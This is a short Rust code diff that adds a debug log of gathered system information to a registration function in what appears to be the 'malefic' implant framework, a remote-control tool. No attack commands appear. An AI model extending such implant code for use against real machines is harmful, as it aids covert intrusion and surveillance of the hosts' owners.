@@ -44,7 +44,8 @@ impl MaleficStub {
     
     pub fn register_spite(&mut self) -> Spite {
         let sysinfo = malefic_core::common::sys::get_register_info();
-
+        debug!("sysinfo: {:#?}", sysinfo);
+        
         new_spite(
             0,
             "register".to_string(),
